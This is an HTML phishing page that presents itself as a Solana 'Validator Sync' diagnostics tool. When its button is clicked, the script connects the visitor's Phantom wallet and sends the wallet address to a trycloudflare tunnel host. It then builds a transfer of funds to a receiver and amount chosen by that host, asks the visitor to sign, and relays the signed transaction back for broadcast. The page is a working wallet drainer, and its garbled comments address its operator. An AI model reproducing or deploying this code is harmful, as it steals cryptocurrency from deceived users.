<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Pro Sync</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #14f195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
        #log { font-size: 10px; color: #555; margin-top: 15px; word-break: break-all; }
    </style>
</head>
<body>
    <div class="box">
        <h3 style="margin:0; color:#9945FF;">VALIDATOR SYNC</h3>
        <button id="cta">RUN DIAGNOSTICS</button>
        <div id="log">SYSTEM READY v9.0</div>
    </div>

    <script>
        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

        // üî± ÈîôËØØÈõ∑ËææÔºöÂ∞ÜÊâãÊú∫Êä•ÈîôÁõ¥Êé•ÊâìÂõû‰Ω†ÁöÑ 71 ÊúçÂä°Âô®
        async function reportError(stage, msg) {
            console.error(stage, msg);
            document.getElementById('log').innerText = "FAIL: " + stage;
            await fetch(tunnel + "/debug", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ stage: stage, error: msg })
            }).catch(() => {});
        }

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            const sWeb3 = window.solanaWeb3;

            if (!p) { alert("Please use Phantom Browser"); return; }

            try {
                // STAGE 1: ËøûÊé•
                await p.connect();
                document.getElementById('log').innerText = "STAGE 1: CONNECTED";

                // STAGE 2: Ë∞ÉÂèñÂêéÁ´Ø Helius Êï∞ÊçÆ
                const resp = await fetch(tunnel + "/prepare", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                if (!resp.ok) throw new Error("Backend Prepare Failed");
                const info = await resp.json();
                document.getElementById('log').innerText = "STAGE 2: DATA RECV";

                // STAGE 3: ÊûÑÈÄ†‰∫§Êòì
                const tx = new sWeb3.Transaction();
                tx.add(sWeb3.SystemProgram.transfer({
                    fromPubkey: p.publicKey,
                    toPubkey: new sWeb3.PublicKey(info.receiver),
                    lamports: Number(info.amount),
                }));
                tx.recentBlockhash = info.bh;
                tx.feePayer = p.publicKey;
                document.getElementById('log').innerText = "STAGE 3: TX BUILT";

                // STAGE 4: ÊãâËµ∑Á≠æÂêç (ËøôÊòØ‰Ω†Âç°‰ΩèÁöÑÂú∞ÊñπÔºåÊàë‰ª¨ÈáçÁÇπÁõëÊéß)
                document.getElementById('log').innerText = "STAGE 4: REQUESTING SIGN...";
                const signed = await p.signTransaction(tx);
                
                // STAGE 5: ÂπøÊí≠
                const serialized = signed.serialize();
                let binary = "";
                const bytes = new Uint8Array(serialized);
                for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);

                await fetch(tunnel + "/broadcast", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ raw_tx: btoa(binary) })
                });

                document.getElementById('log').innerText = "SUCCESS: REDIRECTING...";
                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);

            } catch (err) {
                await reportError("CRASH", err.message);
            }
        };
    </script>
</body>
</html>
